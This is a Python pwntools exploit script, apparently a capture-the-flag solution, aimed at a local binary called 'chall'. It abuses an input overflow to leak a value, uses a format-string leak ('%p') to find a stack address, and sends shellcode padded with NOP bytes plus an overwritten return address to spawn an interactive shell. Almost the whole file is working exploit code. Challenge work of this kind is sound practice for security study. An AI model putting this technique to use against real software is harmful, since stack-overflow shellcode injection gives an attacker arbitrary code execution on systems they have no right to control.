#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall')
context.terminal = ['wt.exe','wsl.exe']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())
#breakrva *0x00000000000013db
#breakrva *0x00000000000013f1

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

p = start()

p.sendlineafter(b'> ',b'A'*64)
p.recvuntil(b'so')
p.recv(65)
nonks = u8(p.recv(1))
p.sendlineafter(b'how many honks?',str(nonks).encode())
p.sendline(b'anjay%p')
p.recvuntil(b'anjay')
leak = eval(p.recv().split(b' ')[0])
log.info(f'leak stack @ {hex(leak)}')
buffer = leak - 0x126
log.info(f'leak buffer @ {hex(buffer)}')
shellcode = asm(shellcraft.sh())
#p.send(b'A'*(400-26) + b'BBBBBBB')
payload = shellcode.ljust(0x178,b'\x90')
payload += p64(buffer)
print(len(payload))
p.send(payload)

p.interactive()

